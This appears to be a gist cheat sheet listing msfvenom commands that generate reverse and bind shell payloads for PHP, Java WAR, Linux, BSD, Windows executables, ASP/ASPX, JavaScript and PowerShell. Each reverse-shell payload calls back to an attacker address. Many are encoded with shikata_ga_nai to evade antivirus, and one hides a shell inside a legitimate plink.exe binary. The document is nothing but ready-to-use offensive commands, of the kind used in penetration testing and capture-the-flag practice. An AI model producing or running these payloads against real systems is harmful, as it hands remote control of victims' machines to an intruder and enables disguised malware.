
### PHP reverse shell

`msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f raw -o shell.php`

### [](https://gist.github.com/dejisec/8cdc3398610d1a0a91d01c9e1fb02ea1#java-war-reverse-shell)Java WAR reverse shell

`msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f war -o shell.war`

### [](https://gist.github.com/dejisec/8cdc3398610d1a0a91d01c9e1fb02ea1#linux-bind-shell)Linux bind shell

`msfvenom -p linux/x86/shell_bind_tcp LPORT=4443 -f c -b "\x00\x0a\x0d\x20" -e x86/shikata_ga_nai`

### [](https://gist.github.com/dejisec/8cdc3398610d1a0a91d01c9e1fb02ea1#linux-freebsd-reverse-shell)Linux FreeBSD reverse shell

`msfvenom -p bsd/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f elf -o shell.elf`

### [](https://gist.github.com/dejisec/8cdc3398610d1a0a91d01c9e1fb02ea1#linux-c-reverse-shell)Linux C reverse shell

`msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f c`

### [](https://gist.github.com/dejisec/8cdc3398610d1a0a91d01c9e1fb02ea1#windows-non-staged-reverse-shell)Windows non staged reverse shell

`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o non_staged.exe`

### [](https://gist.github.com/dejisec/8cdc3398610d1a0a91d01c9e1fb02ea1#windows-staged-meterpreter-reverse-shell)Windows Staged (Meterpreter) reverse shell

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o meterpreter.exe`

### [](https://gist.github.com/dejisec/8cdc3398610d1a0a91d01c9e1fb02ea1#windows-python-reverse-shell)Windows Python reverse shell

`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 EXITFUNC=thread -f python -o shell.py`

### [](https://gist.github.com/dejisec/8cdc3398610d1a0a91d01c9e1fb02ea1#windows-asp-reverse-shell)Windows ASP reverse shell

`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f asp -e x86/shikata_ga_nai -o shell.asp`

### [](https://gist.github.com/dejisec/8cdc3398610d1a0a91d01c9e1fb02ea1#windows-aspx-reverse-shell)Windows ASPX reverse shell

`msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -o shell.aspx`

### [](https://gist.github.com/dejisec/8cdc3398610d1a0a91d01c9e1fb02ea1#windows-javascript-reverse-shell-with-nops)Windows JavaScript reverse shell with nops

`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f js_le -e generic/none -n 18`

### [](https://gist.github.com/dejisec/8cdc3398610d1a0a91d01c9e1fb02ea1#windows-powershell-reverse-shell)Windows Powershell reverse shell

`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1`

### [](https://gist.github.com/dejisec/8cdc3398610d1a0a91d01c9e1fb02ea1#windows-reverse-shell-excluding-bad-characters)Windows reverse shell excluding bad characters

`msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.10.10.10 LPORT=4443 EXITFUNC=thread -f c -b "\x00\x04" -e x86/shikata_ga_nai`

### [](https://gist.github.com/dejisec/8cdc3398610d1a0a91d01c9e1fb02ea1#windows-x64-bit-reverse-shell)Windows x64 bit reverse shell

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -o shell.exe`

### [](https://gist.github.com/dejisec/8cdc3398610d1a0a91d01c9e1fb02ea1#windows-reverse-shell-embedded-into-plink)Windows reverse shell embedded into plink

`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe`